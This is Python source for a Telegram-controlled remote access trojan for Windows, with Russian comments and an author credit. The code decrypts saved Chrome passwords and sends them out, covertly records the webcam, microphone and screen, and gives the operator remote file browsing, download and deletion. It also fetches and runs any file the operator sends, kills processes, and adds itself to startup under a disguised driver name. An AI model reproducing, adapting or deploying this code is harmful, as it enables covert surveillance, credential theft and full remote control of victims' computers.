import os
import cv2
import platform
import pyautogui
import sounddevice as sd
import numpy as np
import webbrowser
import time
from datetime import timedelta
import GPUtil
import sqlite3
import win32crypt
import winreg
import win32com.client
import sys
from Crypto.Cipher import AES
import json
import base64
import shutil
import subprocess
import pygetwindow as gw
import tempfile
from functools import wraps
import mss  # Импорт библиотеки mss для захвата экрана
import wave
from aiogram import Bot, Dispatcher, types
from aiogram.types import InputFile
from aiogram.utils import executor
import psutil  # Библиотека для работы с процессами
import asyncio

# Укажите свой токен Telegram бота
BOT_TOKEN = ''
CHAT_ID = ''

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(bot)

# Папка, в которой будут сохраняться файлы
DOWNLOAD_FOLDER = r"C:\ProgramData\downloaded_files"  # Путь к ProgramData

# Начальная директория (рабочий стол)
current_dir = os.path.expanduser(r"~\OneDrive\Рабочий стол")

# Дефолтные директории
default_dirs = {
    "download": os.path.expanduser(r"~\Downloads"),
    "c:/": "C:/",
    "documents": os.path.expanduser(r"~\Documents"),
    "desktop": os.path.expanduser(r"~\OneDrive\Рабочий стол"),
    "users": r"C:\Users",  # Добавлена директория C:\Users
}

# Создание папки для сохранения файлов, если она не существует
if not os.path.exists(DOWNLOAD_FOLDER):
    os.makedirs(DOWNLOAD_FOLDER)


# def add_to_startup_registry():
#     """Добавить программу в автозагрузку через реестр."""
#     exe_path = sys.executable  # Путь к текущему исполняемому файлу

#     try:
#         # Открываем ключ реестра
#         reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
#                                  r"Software\Microsoft\Windows\CurrentVersion\Run",
#                                  0, winreg.KEY_SET_VALUE)

#         # Добавляем запись
#         winreg.SetValueEx(reg_key, "Intel(R) Dynamic Driver Intergration", 0, winreg.REG_SZ, exe_path)
#         winreg.CloseKey(reg_key)

#         await bot.send_message(CHAT_ID, "Программа в реестре")
#     except Exception as e:
#         await bot.send_message(CHAT_ID, f"Программа в реестре ERROR: {e}")

# # Вызов функции при старте программы
# add_to_startup_registry()


def restricted(func):
    """Декоратор для проверки разрешенного CHAT_ID."""
    @wraps(func)
    async def wrapper(message: types.Message, *args, **kwargs):
        if str(message.chat.id) != CHAT_ID:
            await message.reply("У вас нет доступа к использованию этого бота.")
            return
        return await func(message, *args, **kwargs)
    return wrapper



@dp.message_handler(commands=["start"])
@restricted
async def start_command(message: types.Message):
    commands_info = """
👋 Добро пожаловать! Вот список доступных команд:
 by: https://github.com/Luqidniy

🎥 **Работа с видео и фото:**
/webrec {длительность} — Записать видео с веб-камеры на указанное количество секунд.
/webscreen — Сделать фото с веб-камеры.
/screen — Сделать скриншот экрана.
/screenrec {длительность} — Записать видео экрана на указанное количество секунд.

🎤 **Работа со звуком:**
/voice {длительность} — Записать звук с микрофона на указанное количество секунд.

💻 **Информация и пароли:**
/sysinfo - Информация о ПК
/chrome - Пароли пользователя в Chrome

🔧 **Другие функции:**
/calc — Открыть калькулятор на компьютере.
/vbs {текст ошибки} — Создать и запустить VBS скрипт с указанным текстом ошибки.
/url {ссылка} — Открыть указанную ссылку в браузере.
/startup - добавление в старт меню пока не работает должным образом lol

🔌 **Работа с процессами:**
/list_process - Список процессов
/kill {PID процесса} - отключает процесс

📂 **Работа с файлами:**
Отправьте файл (документ, фото, аудио), и он будет сохранен и запущен на вашем компьютере.

/ls - Показать файлы и папки в текущей директории
/cd [Номер папки или название директории] - Переместиться в папку
/load [Номер файла] - Скачать файл
/rm - удаление файла

ДЕФОЛТНЫЕ ДИРЕКТОРИИ: download, c:/, documents, desktop, users. (Это директории с папкой с загрузками, диском C, Документы, Рабочий стол и Пользователи)
"""
    await message.reply(commands_info)




# Уведомление о запуске программы
async def notify_startup():
    await bot.send_message(CHAT_ID, "Программа запущена на ПК!")

asyncio.run(notify_startup())



async def get_chrome_passwords():
    # Путь к базе данных паролей Chrome
    local_state_path = os.path.join(os.environ['USERPROFILE'], r'AppData\Local\Google\Chrome\User Data\Local State')
    db_path = os.path.join(os.environ['USERPROFILE'], r'AppData\Local\Google\Chrome\User Data\Default\Login Data')

    # Читаем ключ шифрования из Local State
    with open(local_state_path, 'r', encoding='utf-8') as file:
        local_state = json.loads(file.read())
    encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
    encrypted_key = encrypted_key[5:]  # Пропускаем первые 5 байт
    key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

    # Копируем базу данных, чтобы не блокировать Chrome
    shutil.copyfile(db_path, "Login Data.db")

    # Подключаемся к копии базы данных
    conn = sqlite3.connect("Login Data.db")
    cursor = conn.cursor()

    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

    password_data = []
    for row in cursor.fetchall():
        origin_url = row[0]
        username = row[1]
        encrypted_password = row[2]

        # Расшифровка пароля
        nonce, ciphertext = encrypted_password[3:15], encrypted_password[15:-16]
        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
        decrypted_password = cipher.decrypt_and_verify(ciphertext, encrypted_password[-16:])

        password_data.append(f"URL: {origin_url}\nUsername: {username}\nPassword: {decrypted_password.decode('utf-8')}\n")
    
    cursor.close()
    conn.close()
    os.remove("Login Data.db")

    return password_data

async def send_chrome_passwords(message: types.Message):
    password_data = await get_chrome_passwords()

    # Сохраняем в файл
    file_path = os.path.join(DOWNLOAD_FOLDER, "chrome_passwords.txt")
    with open(file_path, "w", encoding='utf-8') as f:
        f.writelines(password_data)

    # Отправляем файл пользователю
    await message.reply("Пароли из Chrome были извлечены и сохранены в файл.")
    await bot.send_document(message.chat.id, InputFile(file_path))

    # Удаляем файл после отправки
    os.remove(file_path)

@dp.message_handler(commands=['chrome'])
@restricted
async def handle_chrome_passwords(message: types.Message):
    await send_chrome_passwords(message)




# Команда для записи видео
@dp.message_handler(commands=["webrec"])
@restricted
async def record_video(message: types.Message):
    args = message.get_args()
    if not args.isdigit():
        await message.reply("Пожалуйста, укажите длительность записи в секундах.")
        return
    duration = int(args)
    
    cap = cv2.VideoCapture(0)
    fourcc = cv2.VideoWriter_fourcc(*'XVID')
    out = cv2.VideoWriter(os.path.join(DOWNLOAD_FOLDER, 'output.avi'), fourcc, 20.0, (640, 480))
    
    for _ in range(duration * 20):  # 20 FPS
        ret, frame = cap.read()
        if ret:
            out.write(frame)
        else:
            break
        await asyncio.sleep(0.05)  # Немного задержки для циклов записи
    
    cap.release()
    out.release()
    await bot.send_document(message.chat.id, InputFile(os.path.join(DOWNLOAD_FOLDER, 'output.avi')))

# Команда для фото с вебкамеры
@dp.message_handler(commands=["webscreen"])
@restricted
async def capture_photo(message: types.Message):
    cap = cv2.VideoCapture(0)
    ret, frame = cap.read()
    if ret:
        photo_path = os.path.join(DOWNLOAD_FOLDER, "photo.jpg")
        cv2.imwrite(photo_path, frame)
        await bot.send_photo(message.chat.id, InputFile(photo_path))
    cap.release()

# Команда для записи звука
@dp.message_handler(commands=["voice"])
@restricted
async def record_audio(message: types.Message):
    args = message.get_args()
    if not args.isdigit():
        await message.reply("Пожалуйста, укажите длительность записи в секундах.")
        return
    duration = int(args)

    fs = 44100  # Частота дискретизации
    channels = 1  # Один канал для моно-записи
    try:
        await message.reply("Начинаю запись звука...")
        # Запись звука
        recording = sd.rec(int(duration * fs), samplerate=fs, channels=channels, dtype='int16')
        sd.wait()

        # Сохранение в WAV файл
        filename = os.path.join(DOWNLOAD_FOLDER, "audio.wav")
        with wave.open(filename, 'wb') as wf:
            wf.setnchannels(channels)
            wf.setsampwidth(2)  # 2 байта на семпл (16 бит)
            wf.setframerate(fs)
            wf.writeframes(recording.tobytes())

        await bot.send_document(message.chat.id, InputFile(filename))
    except Exception as e:
        await message.reply(f"Ошибка при записи: {e}")


# Команда для записи экрана
@dp.message_handler(commands=["screenrec"])
@restricted
async def screen_record(message: types.Message):
    args = message.get_args()
    if not args.isdigit():
        await message.reply("Пожалуйста, укажите длительность записи в секундах.")
        return
    duration = int(args)

    # Установка области захвата экрана (по умолчанию весь экран)
    monitor = {"top": 0, "left": 0, "width": 1920, "height": 1080}  # Размер экрана 1920x1080

    # Инициализация записи видео
    fourcc = cv2.VideoWriter_fourcc(*'XVID')
    out = cv2.VideoWriter(os.path.join(DOWNLOAD_FOLDER, 'screen_capture.avi'), fourcc, 20.0, (monitor['width'], monitor['height']))

    # Захват экрана
    with mss.mss() as sct:
        start_time = asyncio.get_event_loop().time()
        while (asyncio.get_event_loop().time() - start_time) < duration:
            # Снимок экрана
            screenshot = sct.grab(monitor)
            img = np.array(screenshot)
            img = cv2.cvtColor(img, cv2.COLOR_BGRA2BGR)  # Преобразование цвета
            out.write(img)
            await asyncio.sleep(0.05)  # Немного задержки для снижения нагрузки

    out.release()
    await bot.send_document(message.chat.id, InputFile(os.path.join(DOWNLOAD_FOLDER, 'screen_capture.avi')))


# Команда для скриншота экрана
@dp.message_handler(commands=["screen"])
@restricted
async def screenshot(message: types.Message):
    screenshot = pyautogui.screenshot()
    screenshot_path = os.path.join(DOWNLOAD_FOLDER, "screenshot.png")
    screenshot.save(screenshot_path)
    await bot.send_photo(message.chat.id, InputFile(screenshot_path))

@dp.message_handler(commands=["calc"])
@restricted
async def open_calculator(message: types.Message):
    try:
        # Запуск калькулятора в Windows без отображения консоли
        subprocess.Popen(["calc"], shell=True)
        await message.reply("Открываю калькулятор!")
    except Exception as e:
        await message.reply(f"Ошибка при открытии калькулятора: {e}")


@dp.message_handler(commands=["vbs"])
@restricted
async def vbs_error(message: types.Message):
    # Получаем текст ошибки из сообщения после команды
    error_text = message.get_args()
    if not error_text:
        await message.reply("Пожалуйста, укажите текст ошибки после команды.")
        return

    # Создаем VBS скрипт с текстом ошибки
    vbs_code = f'''
    Set objShell = WScript.CreateObject("WScript.Shell")
    objShell.Popup "{error_text}", 5, "Ошибка", 16
    '''

    # Сохраняем VBS код в временный файл
    with tempfile.NamedTemporaryFile(delete=False, suffix=".vbs") as vbs_file:
        vbs_file.write(vbs_code.encode())
        vbs_file_path = vbs_file.name

    try:
        # Запускаем VBS файл без отображения консоли
        subprocess.Popen(["wscript", vbs_file_path], shell=True)
        await message.reply("Ошибка с VBS скриптом была показана!")
    except Exception as e:
        await message.reply(f"Ошибка при выполнении VBS скрипта: {e}")



# Команда для открытия URL в браузере
@dp.message_handler(commands=["url"])
@restricted
async def open_url(message: types.Message):
    # Получаем URL из команды
    url = message.get_args()
    if not url:
        await message.reply("Пожалуйста, укажите ссылку после команды.")
        return

    # Открываем ссылку в браузере
    try:
        webbrowser.open(url)
        await message.reply(f"Открываю ссылку: {url}")
    except Exception as e:
        await message.reply(f"Ошибка при открытии ссылки: {e}")


# Функция для скачивания файла и его запуска
async def download_and_run_file(message: types.Message):
    # Получаем файл
    file_id = message.document.file_id if message.document else \
              message.photo[-1].file_id if message.photo else \
              message.audio.file_id if message.audio else None

    if not file_id:
        await message.reply("Пожалуйста, отправьте файл (фото, видео, звук).")
        return

    # Получаем информацию о файле
    file_info = await bot.get_file(file_id)
    file_name = file_info.file_path.split('/')[-1]
    file_path = os.path.join(DOWNLOAD_FOLDER, file_name)

    # Загружаем файл
    await bot.download_file(file_info.file_path, file_path)

    # Запускаем файл
    try:
        if file_name.lower().endswith(('.jpg', '.jpeg', '.png', '.bmp', '.gif')):
            # Для изображений можно использовать стандартный просмотрщик
            subprocess.run(["start", file_path], shell=True)
        elif file_name.lower().endswith(('.mp4', '.avi', '.mkv')):
            # Для видео
            subprocess.run([file_path], shell=True)
        elif file_name.lower().endswith(('.mp3', '.wav', '.ogg')):
            # Для аудио
            subprocess.run([file_path], shell=True)
        else:
            # Для остальных файлов
            subprocess.run([file_path], shell=True)

        await message.reply(f"Файл '{file_name}' был загружен и запущен на ПК.")
    except Exception as e:
        await message.reply(f"Ошибка при запуске файла: {e}")

# Обработчик для приема всех файлов
@dp.message_handler(content_types=[types.ContentType.DOCUMENT, types.ContentType.PHOTO, types.ContentType.AUDIO])
@restricted
async def handle_file(message: types.Message):
    await download_and_run_file(message)


@dp.message_handler(commands=["list_process"])
@restricted
async def list_process_command(message: types.Message):
    try:
        # Получение списка только пользовательских приложений
        processes = []
        for proc in psutil.process_iter(attrs=["pid", "name"]):
            try:
                # Проверяем, есть ли открытое окно у процесса
                if proc.info["name"] and psutil.Process(proc.info["pid"]).status() == "running":
                    processes.append(f"PID: {proc.info['pid']} - {proc.info['name']}")
            except (psutil.AccessDenied, psutil.NoSuchProcess):
                continue

        # Фильтруем только процессы с окнами (например, программы с графическим интерфейсом)
        filtered_processes = [p for p in processes if "svchost.exe" not in p and "System" not in p]

        if not filtered_processes:
            await message.reply("Не удалось найти активные приложения.")
        else:
            # Ограничиваем вывод первыми 50 процессами
            processes_list = "\n".join(filtered_processes[:50])
            await message.reply(f"📋 Активные приложения (макс. 50):\n\n{processes_list}", parse_mode="HTML")
    except Exception as e:
        await message.reply(f"⚠️ Ошибка при получении списка процессов: {e}")


@dp.message_handler(commands=["kill"])
@restricted
async def kill_process_command(message: types.Message):
    try:
        # Получение PID из аргументов команды
        args = message.get_args()
        if not args.isdigit():
            await message.reply("Пожалуйста, укажите корректный PID процесса.")
            return

        pid = int(args)
        
        # Завершение процесса
        try:
            proc = psutil.Process(pid)
            proc.terminate()  # Завершаем процесс
            await message.reply(f"✅ Процесс с PID {pid} ({proc.name()}) успешно завершён.")
        except psutil.NoSuchProcess:
            await message.reply(f"⚠️ Процесс с PID {pid} не найден.")
        except psutil.AccessDenied:
            await message.reply(f"❌ Нет доступа для завершения процесса с PID {pid}.")
    except Exception as e:
        await message.reply(f"⚠️ Ошибка при завершении процесса: {e}")


@dp.message_handler(commands=["sysinfo"])
@restricted
async def system_info(message: types.Message):
    try:
        # Информация об ОС
        os_name = platform.system()
        os_version = platform.version()
        os_release = platform.release()
        os_architecture = platform.architecture()[0]

        # Информация о процессоре
        cpu_info = platform.processor()
        cpu_count = psutil.cpu_count(logical=True)
        cpu_freq = psutil.cpu_freq()
        cpu_usage = psutil.cpu_percent(interval=1)

        # Оперативная память
        memory = psutil.virtual_memory()
        total_memory = round(memory.total / (1024 ** 3), 2)  # GB
        available_memory = round(memory.available / (1024 ** 3), 2)  # GB

        # Диски
        disk_usage = psutil.disk_usage('/')
        total_disk = round(disk_usage.total / (1024 ** 3), 2)  # GB
        used_disk = round(disk_usage.used / (1024 ** 3), 2)  # GB
        free_disk = round(disk_usage.free / (1024 ** 3), 2)  # GB

        # Время работы системы
        uptime_seconds = time.time() - psutil.boot_time()
        uptime = str(timedelta(seconds=int(uptime_seconds)))

        # Видеокарты
        gpus = GPUtil.getGPUs()
        if gpus:
            gpu_info = "\n".join(
                [
                    f"   - {gpu.name} (Загрузка: {gpu.load * 100:.1f}%, "
                    f"Память: {gpu.memoryFree:.1f}/{gpu.memoryTotal:.1f} MB, "
                    f"Температура: {gpu.temperature}°C)"
                    for gpu in gpus
                ]
            )
        else:
            gpu_info = "   - Не удалось получить информацию о видеокарте"

        # Формируем сообщение
        info = (
            f"**Системная информация:**\n"
            f"🖥️ **Операционная система:** {os_name} {os_release} (Версия: {os_version}, Архитектура: {os_architecture})\n"
            f"🔧 **Процессор:** {cpu_info}\n"
            f"   - Количество ядер: {cpu_count}\n"
            f"   - Частота: {cpu_freq.current:.2f} MHz\n"
            f"   - Загруженность CPU: {cpu_usage}%\n"
            f"💾 **Оперативная память:**\n"
            f"   - Всего: {total_memory} GB\n"
            f"   - Доступно: {available_memory} GB\n"
            f"💽 **Диск:**\n"
            f"   - Всего: {total_disk} GB\n"
            f"   - Использовано: {used_disk} GB\n"
            f"   - Свободно: {free_disk} GB\n"
            f"🎮 **Видеоадаптеры:**\n{gpu_info}\n"
            f"⏳ **Время работы системы:** {uptime}\n"
        )

        await message.reply(info, parse_mode="Markdown")
    except Exception as e:
        await message.reply(f"Ошибка при получении системной информации: {e}")


async def get_directory_listing(path):
    try:
        files = os.listdir(path)
        files = [f for f in files if not f.startswith('.')]  # Пропускаем скрытые файлы
        return files
    except Exception as e:
        return f"Ошибка при получении содержимого: {e}"

@dp.message_handler(commands=["ls"])
@restricted
async def ls_command(message: types.Message):
    global current_dir

    # Получаем список файлов и папок в текущей директории
    files = await get_directory_listing(current_dir)
    if isinstance(files, str):  # Если произошла ошибка
        await message.reply(files)
        return
    
    # Создаем список для отображения
    file_list = []
    for i, file in enumerate(files):
        file_path = os.path.join(current_dir, file)
        if os.path.isdir(file_path):
            file_list.append(f"{i + 1}. 📂 {file}")  # Добавляем иконку для папок
        else:
            file_list.append(f"{i + 1}. {file}")  # Для файлов без изменений
    await message.reply(f"Вы находитесь в: {current_dir}:\n" + "\n".join(file_list))

@dp.message_handler(commands=["cd"])
@restricted
async def cd_command(message: types.Message):
    global current_dir

    # Получаем номер папки из аргументов
    args = message.get_args()
    if args.isdigit():
        folder_number = int(args) - 1
        files = await get_directory_listing(current_dir)
        if folder_number < len(files):
            folder = files[folder_number]
            folder_path = os.path.join(current_dir, folder)
            if os.path.isdir(folder_path):  # Проверка, что это папка
                current_dir = folder_path
                await message.reply(f"Вы переместились в: {current_dir}")
            else:
                await message.reply("Выбранный элемент не является папкой.")
        else:
            await message.reply("Неверный номер папки.")
    else:
        # Если передано имя дефолтной директории
        if args.lower() in default_dirs:
            current_dir = default_dirs[args.lower()]
            await message.reply(f"Вы переместились в: {current_dir}")
        else:
            await message.reply("Неверное имя директории.")

@dp.message_handler(commands=["load"])
@restricted
async def load_command(message: types.Message):
    global current_dir

    # Получаем номер файла для загрузки
    args = message.get_args()
    if args.isdigit():
        file_number = int(args) - 1
        files = await get_directory_listing(current_dir)
        if file_number < len(files):
            file_name = files[file_number]
            file_path = os.path.join(current_dir, file_name)
            if os.path.isfile(file_path):  # Проверка, что это файл
                await message.reply(f"Загружаю файл: {file_name}")
                await bot.send_document(message.chat.id, InputFile(file_path))
            else:
                await message.reply("Выбранный элемент не является файлом.")
        else:
            await message.reply("Неверный номер файла.")
    else:
        await message.reply("Пожалуйста, укажите номер файла для загрузки.")


@dp.message_handler(commands=["rm"])
@restricted
async def rm_command(message: types.Message):
    global current_dir

    # Получаем номер файла или директории для удаления
    args = message.get_args()
    if args.isdigit():
        file_number = int(args) - 1
        files = await get_directory_listing(current_dir)
        if file_number < len(files):
            target_name = files[file_number]
            target_path = os.path.join(current_dir, target_name)
            try:
                if os.path.isdir(target_path):
                    os.rmdir(target_path)  # Удаляем пустую директорию
                    await message.reply(f"Папка '{target_name}' успешно удалена.")
                elif os.path.isfile(target_path):
                    os.remove(target_path)  # Удаляем файл
                    await message.reply(f"Файл '{target_name}' успешно удален.")
                else:
                    await message.reply("Не удалось определить тип элемента для удаления.")
            except Exception as e:
                await message.reply(f"Ошибка при удалении: {e}")
        else:
            await message.reply("Неверный номер файла или папки.")
    else:
        await message.reply("Пожалуйста, укажите номер файла или папки для удаления.")


def add_to_startup():
    """Добавляет текущий исполняемый файл в папку автозагрузки."""
    startup_folder = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
    exe_path = sys.executable  # Путь к текущему исполняемому файлу

    shortcut_name = "MyApp.lnk"  # Имя ярлыка
    shortcut_path = os.path.join(startup_folder, shortcut_name)

    try:
        if not os.path.exists(shortcut_path):
            shell = win32com.client.Dispatch("WScript.Shell")
            shortcut = shell.CreateShortcut(shortcut_path)
            shortcut.TargetPath = exe_path
            shortcut.WorkingDirectory = os.path.dirname(exe_path)
            shortcut.Save()
            return "Программа успешно добавлена в автозагрузку!"
        else:
            return "Ярлык уже существует в папке автозагрузки."
    except Exception as e:
        return f"Ошибка при добавлении в автозагрузку: {e}"


@dp.message_handler(commands=['startup'])
@restricted
async def startup_command(message: types.Message):
    result = add_to_startup()
    await message.reply(result)



if __name__ == "__main__":
    async def main():
        await dp.start_polling()

    asyncio.run(main())